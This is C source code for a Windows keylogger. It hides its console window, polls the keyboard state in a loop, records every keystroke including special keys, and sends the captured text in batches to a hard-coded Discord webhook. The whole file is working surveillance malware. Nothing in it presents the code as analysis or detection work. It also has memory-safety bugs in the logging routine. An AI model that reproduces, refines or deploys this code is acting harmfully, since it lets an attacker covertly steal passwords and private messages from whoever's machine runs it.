#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <wininet.h>

#define BUFFER_SIZE 30
char key_buffer[BUFFER_SIZE] = {0};
int buffer_index = 0;

int sendtowebhook(const char* log) {
    HINTERNET hSession = InternetOpenW(
        L"Discord Webhook",           // User Agent Name
        INTERNET_OPEN_TYPE_PRECONFIG, // Use System Settings for Internet Access
        NULL,                         // No explicit proxy used
        NULL,                         // No proxy bypass
        0                             // No Additional flags
    );

    if (!hSession) {
        printf("InternetOpenW failed: %lu\n", GetLastError());
        return 1;
    }

    HINTERNET hConnect = InternetConnectW(
        hSession,                     // Use InternetOpenW Handle
        L"discordapp.com",               // Internet Server Hostname
        INTERNET_DEFAULT_HTTPS_PORT,  // HTTPS Port
        NULL,                         // No need for Username
        NULL,                         // No need for Password
        INTERNET_SERVICE_HTTP,        // HTTP is the type of service to access
        0,                            // No need for return value
        0);                           // No need for remarks

    if (!hConnect) {
        printf("InternetConnectW failed: %lu\n", GetLastError());
        InternetCloseHandle(hSession);
        return 1;
    }

    HINTERNET hRequest = HttpOpenRequestW(
        hConnect, 
        L"POST", 
        L"/api/webhooks/1354552015124037935/fNh0zz10zIkWPlE0mG-6kOBtfdS7_uhqwfXrFylLmQr5YIf3BYNGSpOgKb6LuY7sWU8E", 
        NULL, 
        NULL, 
        NULL, 
        INTERNET_FLAG_SECURE, 
        0);

    if (!hRequest) { 
        printf("HttpOpenRequestW failed: %lu\n", GetLastError());
        return 1;
        InternetCloseHandle(hSession);
        InternetCloseHandle(hConnect);
    }

     // Define the JSON payload to send
     char postData[512];  // Adjust size if necessary
     snprintf(postData, sizeof(postData), "{\"content\": \"%s\"}", log);

     DWORD postDataLength = (DWORD)strlen(postData);
 
     // Create headers including Content-Length
     char headers[256];
     snprintf(headers, sizeof(headers),
         "Content-Type: application/json\r\n"
         "Content-Length: %lu\r\n", postDataLength);

    // Send the HTTP Request with headers and data

    if (!HttpSendRequestA(
        hRequest, 
        headers, 
        (DWORD)strlen(headers), 
        (LPVOID)postData, 
        postDataLength
    ))

    {
        printf("HttpSendRequestA failed:%lu\n", GetLastError());
    } else {
        printf("Request sent Successfully \n");
    }

    InternetCloseHandle(hSession);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hRequest);
    return 0;
}


void logkeys(const char* log) {
    int len = strlen(log);
    if (buffer_index + len >= BUFFER_SIZE) {
        sendtowebhook(key_buffer);
        buffer_index = 0;
        key_buffer[0] = '\0';
    }
    strcpy(key_buffer + buffer_index, log);
    buffer_index += len;
}

int handlespecialkeys(int key) {
    switch (key) {
        case VK_SPACE:     logkeys(" ");         return 1;
        case VK_RETURN:    logkeys("\n");        return 1;
        case VK_SHIFT:     logkeys("[Shift]");   return 1;
        case VK_BACK:      logkeys("[Backspace]"); return 1;
        case VK_TAB:       logkeys("[Tab]");     return 1;
        case VK_CONTROL:   logkeys("[Ctrl]");    return 1;
        case VK_MENU:      logkeys("[Alt]");     return 1;
        default: return 0;
    }
}

void process_key(int key, short pressed_keys[]) {
    if (!pressed_keys[key]) {  // Check if key was previously unpressed
        pressed_keys[key] = 1;

        if (!handlespecialkeys(key)) {  
                char character = (char)key;
                logkeys(&character);
        }
    }
}


int main() {
    SystemParametersInfo(SPI_SETBEEP, 0, 0, SPIF_SENDCHANGE);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    short pressed_keys[256] = {0};
    
    while (1) {
        Sleep(20);
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) & 0x8000) {
                process_key(key, pressed_keys);
            } else {
                pressed_keys[key] = 0;  // Reset when key is released
            }
        }
    }

    return 0;
}
